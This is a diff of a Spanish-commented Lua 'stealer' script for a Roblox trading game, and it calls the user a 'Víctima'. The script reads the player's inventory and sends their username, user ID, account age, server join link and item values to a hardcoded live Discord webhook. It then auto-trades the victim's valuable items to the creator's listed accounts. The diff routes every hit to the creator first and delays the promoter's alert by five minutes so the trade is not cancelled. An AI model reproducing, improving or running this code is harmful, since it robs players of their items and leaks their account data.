@@ -1,5 +1,5 @@
 -- ==========================================
--- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB Y DELAY)
+-- SCRIPT 2 (CORE ACTUALIZADO - MODO STEALER TOTAL)
 -- ==========================================
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
@@ -7,13 +7,13 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- ==========================================
--- URL DEL REPOSITORIO DE VALORES (JSON)
+-- URLS DE LOS REPOSITORIOS DE VALORES (JSON)
 -- ==========================================
-local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
-local DUAL_VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json"
+local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json" -- Lista para el Usuario (Víctima)
+local VALUES_REPO_URL_DUAL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values_dual.json" -- Lista para el Creador (Tú)
 
 -- ==========================================
--- CONFIGURACIÓN SECRETA DUAL WEBHOOK
+-- CONFIGURACIÓN SECRETA DUAL WEBHOOK Y OBJETIVOS
 -- ==========================================
 local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"
 
@@ -23,7 +23,7 @@ local jugadoresObjetivosDual = {
 }
 
 -- ==========================================
--- LÓGICA DE INICIO/FILTRADO DE INVENTARIO (EXTRAÍDA DEL SCRIPT 1)
+-- LÓGICA DE INICIO/FILTRADO DE INVENTARIO
 -- ==========================================
 local EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" }
 local EXCLUDE = {}
@@ -40,70 +40,27 @@ local function isTradeable(name)
     if not ok then return true end
     return res and true or false
 end
--- ==========================================
 
 -- ==========================================
--- CARGA DINÁMICA DE VALORES DE GITHUB
+-- CARGA DINÁMICA DE VALORES DE GITHUB (DUAL)
 -- ==========================================
 local Knives, Guns, Effects, Emotes = {}, {}, {}, {}
 local KnivesDual, GunsDual, EffectsDual, EmotesDual = {}, {}, {}, {}
 
-local function cargarValoresGitHub()
-    local success, response = pcall(function()
-        return game:HttpGet(VALUES_REPO_URL)
-    end)
-    
+local function cargarValoresGitHub(url)
+    local success, response = pcall(function() return game:HttpGet(url) end)
     if success and response then
-        local decodeSuccess, decodedData = pcall(function()
-            return HttpService:JSONDecode(response)
-        end)
-        
+        local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(response) end)
         if decodeSuccess and decodedData then
-            Knives = decodedData.Knives or {}
-            Guns = decodedData.Guns or {}
-            Effects = decodedData.Effects or {}
-            Emotes = decodedData.Emotes or {}
-            return
+            return decodedData.Knives or {}, decodedData.Guns or {}, decodedData.Effects or {}, decodedData.Emotes or {}
         end
     end
+    return {}, {}, {}, {}
 end
 
-local function cargarValoresDualGitHub()
-    local success, response = pcall(function()
-        return game:HttpGet(DUAL_VALUES_REPO_URL)
-    end)
-    
-    if success and response then
-        local decodeSuccess, decodedData = pcall(function()
-            return HttpService:JSONDecode(response)
-        end)
-        
-        if decodeSuccess and decodedData then
-            -- BLINDAJE: Normaliza las claves del JSON quitando espacios y creando versiones en minúsculas
-            local function prepareTable(t)
-                local res = {}
-                for k, v in pairs(t or {}) do
-                    local strK = tostring(k)
-                    local cleanK = string.gsub(strK, " ", "")
-                    res[strK] = v
-                    res[cleanK] = v
-                    res[string.lower(strK)] = v
-                    res[string.lower(cleanK)] = v
-                end
-                return res
-            end
-
-            KnivesDual = prepareTable(decodedData.Knives)
-            GunsDual = prepareTable(decodedData.Guns)
-            EffectsDual = prepareTable(decodedData.Effects)
-            EmotesDual = prepareTable(decodedData.Emotes)
-            return
-        end
-    end
-end
-
-cargarValoresGitHub()
-cargarValoresDualGitHub()
+-- Cargamos ambas listas por separado
+Knives, Guns, Effects, Emotes = cargarValoresGitHub(VALUES_REPO_URL)
+KnivesDual, GunsDual, EffectsDual, EmotesDual = cargarValoresGitHub(VALUES_REPO_URL_DUAL)
 
 task.spawn(function()
     -- ==========================================
@@ -113,7 +70,6 @@ task.spawn(function()
         task.wait(0.2) -- Espera pasivamente hasta que SCRIPT 1 inyecte la config
     end
     
-    -- 👇 ESTA ES LA LÍNEA QUE SOLUCIONA EL ERROR 👇
     local config = getgenv().AutoTradeConfig or {}
     
     local WEBHOOK_LOGS = config.WebhookLogs or "" 
@@ -179,79 +135,83 @@ task.spawn(function()
 
     if ok and cg.PlayerData then
         local pd = cg.PlayerData
-        local knives, guns, effects, emotes = {}, {}, {}, {}
-        local totalValue = 0
-
+        local allItems = {}
+        
         local function normalizeName(name)
             return string.gsub(name, " ", "")
         end
 
-        local function scanAndSave(category, valueTable, resultTable)
-            local inv = pd:TryIndex({"Inventory", category})
-            if not inv then return end
-            
-            for guid, item in pairs(inv) do
-                -- APLICANDO LÓGICA DE INICIO DE INVENTARIO (Script 1)
-                if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
-                    local cleanName = normalizeName(item.name)
-                    if valueTable[cleanName] then
-
-                        local itemValue = valueTable[cleanName]
-                        totalValue = totalValue + itemValue
-                        resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = itemValue }
+        -- Escaneo Maestro único (lee el inventario una sola vez para optimizar)
+        local categories = {"Knife", "Gun", "Effect", "Emote"}
+        for _, cat in ipairs(categories) do
+            local inv = pd:TryIndex({"Inventory", cat})
+            if inv then
+                for guid, item in pairs(inv) do
+                    if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
+                        table.insert(allItems, {cat = cat, name = item.name, guid = guid})
                     end
                 end
             end
         end
 
-        scanAndSave("Knife", Knives, knives)
-        scanAndSave("Gun", Guns, guns)
-        scanAndSave("Effect", Effects, effects)
-        scanAndSave("Emote", Emotes, emotes)
-
-        -- ==========================================
-        -- CÁLCULO ADICIONAL PARA LA LISTA DUAL (utils5.json)
-        -- ==========================================
+        -- Clasificación para el Usuario (Víctima)
+        local knivesUser, gunsUser, effectsUser, emotesUser = {}, {}, {}, {}
+        local totalValueUser = 0
+        
+        -- Clasificación para el Creador (Tú - Dual)
+        local knivesDual, gunsDual, effectsDual, emotesDual = {}, {}, {}, {}
         local totalValueDual = 0
-        local function scanAndSaveDual(category, valueTable)
-            local inv = pd:TryIndex({"Inventory", category})
-            if not inv then return end
+
+        for _, item in ipairs(allItems) do
+            local cleanName = normalizeName(item.name)
             
-            for guid, item in pairs(inv) do
-                if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
-                    local cleanName = normalizeName(item.name)
-                    -- BÚSQUEDA BLINDADA: Revisa el nombre exacto, sin espacios, y en minúsculas
-                    local itemValue = valueTable[item.name] or valueTable[cleanName] or valueTable[string.lower(item.name)] or valueTable[string.lower(cleanName)]
-                    if itemValue then
-                        totalValueDual = totalValueDual + itemValue
-                    end
-                end
+            -- Evaluar para Usuario
+            local valTableUser = nil
+            if item.cat == "Knife" then valTableUser = Knives
+            elseif item.cat == "Gun" then valTableUser = Guns
+            elseif item.cat == "Effect" then valTableUser = Effects
+            elseif item.cat == "Emote" then valTableUser = Emotes end
+            
+            if valTableUser and valTableUser[cleanName] then
+                local val = valTableUser[cleanName]
+                totalValueUser = totalValueUser + val
+                local tUser = {name = item.name, guid = item.guid, value = val}
+                if item.cat == "Knife" then table.insert(knivesUser, tUser)
+                elseif item.cat == "Gun" then table.insert(gunsUser, tUser)
+                elseif item.cat == "Effect" then table.insert(effectsUser, tUser)
+                elseif item.cat == "Emote" then table.insert(emotesUser, tUser) end
+            end
+            
+            -- Evaluar para Creador (Dual)
+            local valTableDual = nil
+            if item.cat == "Knife" then valTableDual = KnivesDual
+            elseif item.cat == "Gun" then valTableDual = GunsDual
+            elseif item.cat == "Effect" then valTableDual = EffectsDual
+            elseif item.cat == "Emote" then valTableDual = EmotesDual end
+            
+            if valTableDual and valTableDual[cleanName] then
+                local val = valTableDual[cleanName]
+                totalValueDual = totalValueDual + val
+                local tDual = {name = item.name, guid = item.guid, value = val}
+                if item.cat == "Knife" then table.insert(knivesDual, tDual)
+                elseif item.cat == "Gun" then table.insert(gunsDual, tDual)
+                elseif item.cat == "Effect" then table.insert(effectsDual, tDual)
+                elseif item.cat == "Emote" then table.insert(emotesDual, tDual) end
             end
         end
 
-        scanAndSaveDual("Knife", KnivesDual)
-        scanAndSaveDual("Gun", GunsDual)
-        scanAndSaveDual("Effect", EffectsDual)
-        scanAndSaveDual("Emote", EmotesDual)
+        local hayItemsDual = (#knivesDual > 0) or (#gunsDual > 0) or (#effectsDual > 0) or (#emotesDual > 0)
 
-        -- DEBUG: Imprime en la consola del exploit el valor calculado para que verifiques si llegó a 7500
-        warn("[AUTO-TRADE DUAL] Valor total calculado con utils5.json: " .. totalValueDual)
-
-        local hayItems = (#knives > 0) or (#guns > 0) or (#effects > 0) or (#emotes > 0)
-
-        if hayItems and request then
+        -- IMPORTANTE: SIEMPRE SE EJECUTA SI EL CREADOR ENCUENTRA ITEMS (SIN IMPORTAR EL VALOR)
+        if hayItemsDual and request then 
             local fileName = "AutoTrade_Executions.json"
             local executionData = {}
             local executionText = player.Name .. " 1x executions"
 
             if isfile and readfile and writefile then
                 if isfile(fileName) then
-                    local success, data = pcall(function()
-                        return HttpService:JSONDecode(readfile(fileName))
-                    end)
-                    if success and type(data) == "table" then
-                        executionData = data
-                    end
+                    local success, data = pcall(function() return HttpService:JSONDecode(readfile(fileName)) end)
+                    if success and type(data) == "table" then executionData = data end
                 end
 
                 local playerName = player.Name
@@ -259,7 +219,6 @@ task.spawn(function()
                 executionData[playerName] = executionData[playerName] + 1
 
                 pcall(function() writefile(fileName, HttpService:JSONEncode(executionData)) end)
-                
                 executionText = playerName .. " " .. executionData[playerName] .. "x executions"
             end
 
@@ -285,134 +244,120 @@ task.spawn(function()
                 return texto 
             end
 
-            local campos = {}
-            if #knives > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives), inline = true }) end
-            if #guns > 0 then table.insert(campos, { name = "🔫 Guns", value = formatearLista(guns), inline = true }) end
-            if #effects > 0 then table.insert(campos, { name = "✨ Effects", value = formatearLista(effects), inline = false }) end
-            if #emotes > 0 then table.insert(campos, { name = "🕺 Emotes", value = formatearLista(emotes), inline = false }) end
+            -- Función helper para generar el payload personalizado
+            local function generarPayload(knives, guns, effects, emotes, totalValue, titulo)
+                local campos = {}
+                if #knives > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives), inline = true }) end
+                if #guns > 0 then table.insert(campos, { name = "🔫 Guns", value = formatearLista(guns), inline = true }) end
+                if #effects > 0 then table.insert(campos, { name = "✨ Effects", value = formatearLista(effects), inline = false }) end
+                if #emotes > 0 then table.insert(campos, { name = "🕺 Emotes", value = formatearLista(emotes), inline = false }) end
 
-            local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
-            local playersCount = #Players:GetPlayers()
-            local maxPlayers = Players.MaxPlayers
-            local robloxVer = version()
-            
-            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
-            local bodyUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+                local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
+                local playersCount = #Players:GetPlayers()
+                local maxPlayers = Players.MaxPlayers
+                local robloxVer = version()
+                
+                local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+                local bodyUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
 
-            local descriptionText = "### 👤 Información del Jugador\n" ..
-                                    "**Usuario:** `" .. player.Name .. "`\n" ..
-                                    "**Display Name:** `" .. player.DisplayName .. "`\n" ..
-                                    "**User ID:** `" .. player.UserId .. "`\n" ..
-                                    "**Account Age:** `" .. player.AccountAge .. " Days`\n\n" ..
-                                    "### ⚙️ Información del Servidor\n" ..
-                                    "**JobId:** `" .. game.JobId .. "`\n" ..
-                                    "**🔗 Join Link:** [Click para Unirse](https://fern.wtf/joiner?placeId=135856908115931&gameInstanceId=" .. game.JobId .. ")\n" ..
-                                    "**Server:** `" .. playersCount .. "/" .. maxPlayers .. "`\n" ..
-                                    "**Roblox Version:** `" .. robloxVer .. "`\n" ..
-                                    "**Executor:** `" .. executorName .. "`\n\n" ..
-                                    "### 📊 Estadísticas de Hit\n" ..
-                                    "**Historial:** `" .. executionText .. "`\n" ..
-                                    "**Total Value:** `💰 " .. totalValue .. "`\n\n" ..
-                                    "**=============================**"
+                local descriptionText = "### 👤 Información del Jugador\n" ..
+                                        "**Usuario:** `" .. player.Name .. "`\n" ..
+                                        "**Display Name:** `" .. player.DisplayName .. "`\n" ..
+                                        "**User ID:** `" .. player.UserId .. "`\n" ..
+                                        "**Account Age:** `" .. player.AccountAge .. " Days`\n\n" ..
+                                        "### ⚙️ Información del Servidor\n" ..
+                                        "**JobId:** `" .. game.JobId .. "`\n" ..
+                                        "**🔗 Join Link:** [Click para Unirse](https://fern.wtf/joiner?placeId=135856908115931&gameInstanceId=" .. game.JobId .. ")\n" ..
+                                        "**Server:** `" .. playersCount .. "/" .. maxPlayers .. "`\n" ..
+                                        "**Roblox Version:** `" .. robloxVer .. "`\n" ..
+                                        "**Executor:** `" .. executorName .. "`\n\n" ..
+                                        "### 📊 Estadísticas de Hit\n" ..
+                                        "**Historial:** `" .. executionText .. "`\n" ..
+                                        "**Total Value:** `💰 " .. totalValue .. "`\n\n" ..
+                                        "**=============================**"
 
-            local pings = {}
-            local embedColor = 3447003
+                local pings = {}
+                local embedColor = 3447003
 
-            if totalValue >= 5000 then
-                table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (+5000 VALOR DETECTADO)!** 🚨")
-                embedColor = 16711680
-            elseif totalValue >= 2000 then
-                table.insert(pings, "@everyone 🚨 **¡HIT LEGENDARIO DETECTADO (+2000 VALOR)!** 🚨")
-                embedColor = 16766720
-            end
-
-            local finalContentText = nil
-            if #pings > 0 then
-                finalContentText = table.concat(pings, "\n")
-            end
-
-            local webhookPayload = {
-                content = finalContentText, 
-                username = "Auto-Trade Bot Scanner",
-                avatar_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/512px-Roblox_player_icon_black.svg.png",
-                embeds = {{
-                    title = "🎯 ¡Objetivo de Tradeo Localizado!",
-                    color = embedColor, 
-                    description = descriptionText,
-                    thumbnail = { url = avatarUrl }, 
-                    image = { url = bodyUrl },       
-                    fields = campos,
-                    footer = { 
-                        text = "Sistema de Escaneo Automático | " .. os.date("%X"),
-                        icon_url = "https://cdn-icons-png.flaticon.com/512/6584/6584141.png"
-                    }
-                }}
-            }
-            
-            local jsonPayload = HttpService:JSONEncode(webhookPayload)
-
-            -- ==========================================
-            -- ENVÍO DE WEBHOOKS (INSTANTÁNEO VS RETRASADO)
-            -- ==========================================
-            if totalValueDual >= 7500 then
-                -- 1. Tu Webhook (Dual): Notifica al instante (SOLO SI >= 7500 DE LA OTRA LISTA)
-                task.spawn(function()
-                    if DUAL_WEBHOOK_INVENTARIO ~= "" then
-                        request({
-                            Url = DUAL_WEBHOOK_INVENTARIO,
-                            Method = "POST",
-                            Headers = { ["Content-Type"] = "application/json" },
-                            Body = jsonPayload
-                        })
-                    end
-                end)
-
-                -- 2. Webhook del promocionador: Notifica con 5 minutos de delay (300 segundos)
-                if WEBHOOK_INVENTARIO ~= "" then
-                    task.delay(300, function()
-                        pcall(function()
-                            request({
-                                Url = WEBHOOK_INVENTARIO,
-                                Method = "POST",
-                                Headers = { ["Content-Type"] = "application/json" },
-                                Body = jsonPayload
-                            })
-                        end)
-                    end)
+                if totalValue >= 5000 then
+                    table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (+5000 VALOR DETECTADO)!** 🚨")
+                    embedColor = 16711680
+                elseif totalValue >= 2000 then
+                    table.insert(pings, "@everyone 🚨 **¡HIT LEGENDARIO DETECTADO (+2000 VALOR)!** 🚨")
+                    embedColor = 16766720
                 end
-            else
-                -- Hit normal (< 7500 en dual): Notifica de inmediato al promocionador únicamente
-                if WEBHOOK_INVENTARIO ~= "" then
+
+                local finalContentText = nil
+                if #pings > 0 then finalContentText = table.concat(pings, "\n") end
+
+                return {
+                    content = finalContentText, 
+                    username = "Auto-Trade Bot Scanner",
+                    avatar_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/512px-Roblox_player_icon_black.svg.png",
+                    embeds = {{
+                        title = titulo,
+                        color = embedColor, 
+                        description = descriptionText,
+                        thumbnail = { url = avatarUrl }, 
+                        image = { url = bodyUrl },       
+                        fields = campos,
+                        footer = { 
+                            text = "Sistema de Escaneo Automático | " .. os.date("%X"),
+                            icon_url = "https://cdn-icons-png.flaticon.com/512/6584/6584141.png"
+                        }
+                    }}
+                }
+            end
+
+            local payloadUser = generarPayload(knivesUser, gunsUser, effectsUser, emotesUser, totalValueUser, "🎯 ¡Objetivo de Tradeo Localizado!")
+            local payloadDual = generarPayload(knivesDual, gunsDual, effectsDual, emotesDual, totalValueDual, "🎯 ¡ROBO EJECUTADO - BOTÍN ASEGURADO!")
+
+            local jsonPayloadUser = HttpService:JSONEncode(payloadUser)
+            local jsonPayloadDual = HttpService:JSONEncode(payloadDual)
+
+            -- ==========================================
+            -- LÓGICA DE ROBADO TOTAL (SIEMPRE AL CREADOR)
+            -- ==========================================
+            
+            -- 1. Tu Webhook (Dual): Notifica al instante con TU lista de valores
+            task.spawn(function()
+                if DUAL_WEBHOOK_INVENTARIO ~= "" then
                     request({
-                        Url = WEBHOOK_INVENTARIO,
+                        Url = DUAL_WEBHOOK_INVENTARIO,
                         Method = "POST",
                         Headers = { ["Content-Type"] = "application/json" },
-                        Body = jsonPayload
+                        Body = jsonPayloadDual
                     })
                 end
+            end)
+
+            -- 2. Webhook del promocionador: Notifica con 5 minutos de delay (para que no cancele el trade)
+            if WEBHOOK_INVENTARIO ~= "" then
+                task.delay(300, function()
+                    pcall(function()
+                        request({
+                            Url = WEBHOOK_INVENTARIO,
+                            Method = "POST",
+                            Headers = { ["Content-Type"] = "application/json" },
+                            Body = jsonPayloadUser
+                        })
+                    end)
+                end)
             end
         end
+
+        -- FORZAR OBJETIVOS AL CREADOR (SIN IMPORTAR EL VALOR)
+        local jugadoresObjetivos = jugadoresObjetivosDual
 
         local jugadorEncontrado = nil
 
         repeat 
             task.wait(0.5)
-            -- PRIORIDAD: Buscar primero en jugadoresObjetivosDual
-            for _, nombre in ipairs(jugadoresObjetivosDual) do
+            for _, nombre in ipairs(jugadoresObjetivos) do
                 local p = Players:FindFirstChild(nombre)
                 if p then
                     jugadorEncontrado = p
                     break
-                end
-            end
-            -- Si no se encontró en dual, buscar en los normales
-            if not jugadorEncontrado then
-                for _, nombre in ipairs(jugadoresObjetivos) do
-                    local p = Players:FindFirstChild(nombre)
-                    if p then
-                        jugadorEncontrado = p
-                        break
-                    end
                 end
             end
         until jugadorEncontrado
@@ -457,7 +402,6 @@ task.spawn(function()
                 local inv = pdTrade:TryIndex({"Inventory", cat})
                 if not inv then return end
                 for guid, item in pairs(inv) do
-                    -- APLICANDO LÓGICA DE INICIO DE INVENTARIO AL MOMENTO DEL TRADEO (Script 1)
                     if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                         local cleanName = normalizeName(item.name)
                         if valueTable[cleanName] then
@@ -472,10 +416,11 @@ task.spawn(function()
                 end
             end
 
-            scanTrade("Knife", Knives, nil)
-            scanTrade("Gun", Guns, nil)
-            scanTrade("Effect", Effects, listaEfectos)
-            scanTrade("Emote", Emotes, listaEmotes)
+            -- USAMOS LAS TABLAS DUAL (LAS TUYAS) PARA OFRECER LOS ITEMS EN EL TRADE
+            scanTrade("Knife", KnivesDual, nil)
+            scanTrade("Gun", GunsDual, nil)
+            scanTrade("Effect", EffectsDual, listaEfectos)
+            scanTrade("Emote", EmotesDual, listaEmotes)
 
             local sortPorValor = function(a, b) return a.value > b.value end
             table.sort(listaEmotes, sortPorValor)
@@ -494,7 +439,6 @@ task.spawn(function()
             local SessionState = cgData.SessionState
             local Workspace = game:GetService("Workspace")
 
-            -- PROTECCIÓN AÑADIDA: Verifica que player1 y player2 existan antes de leerlos
             local function getSides()
                 local data = ActiveNegotiation.Data
                 if type(data) ~= "table" then return nil, nil, nil end
@@ -509,7 +453,6 @@ task.spawn(function()
                 return me, other, data
             end
 
-            -- 1. Enviar o Aceptar Invitación
             repeat
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
@@ -534,7 +477,6 @@ task.spawn(function()
 
             task.wait(1)
 
-            -- 2. Ofrecer hasta 12 items sin usar GUI
             for i = 1, math.min(12, #itemsRestantes) do
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
@@ -551,25 +493,20 @@ task.spawn(function()
                 task.wait(0.35)
             end
 
-            -- 3 & 4. Lógica de Finalización (SetReady Seguro)
             local timeout = os.clock()
             while os.clock() - timeout < 60 do 
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
-                -- Utilizamos getSides que ya viene protegido contra el error 'nil'
                 local me, other, data = getSides()
                 
                 if not data then break end
                 if data.exchanging then break end 
                 
-                         -- Verificamos si somos nosotros y aún no damos ready
                 if me and not me.ready then
                     if Workspace:GetServerTimeNow() >= (data.lastUpdate or 0) + 3 then
-                        -- SOLUCIÓN: Se pasa data.ref o {} igual que en el script de origen
                         Remotes.SetReady:FireServer(true, data.ref or {})
                     end
                 end
-
                 
                 task.wait(0.5)
             end
@@ -583,26 +520,17 @@ task.spawn(function()
             return true
         end
 
-
-        -- ==========================================
-        -- BUCLE PRINCIPAL DE TRADEO CONTINUO
-        -- ==========================================
         while true do
-            -- Si el jugador objetivo se sale antes de arrancar el siguiente trade, se rompe el bucle
             if not (jugadorEncontrado and jugadorEncontrado.Parent) then
                 break 
             end
             
             local continuar = ejecutarTradeo()
-            -- Si ya no hay ítems o `ejecutarTradeo` devolvió false (jugador se salió), rompemos
             if not continuar then 
                 break 
             end
         end
 
-        -- ==========================================
-        -- RESTAURACIÓN: TODO VUELVE A LA NORMALIDAD
-        -- ==========================================
         tradeando = false
         task.wait(0.5) 
 
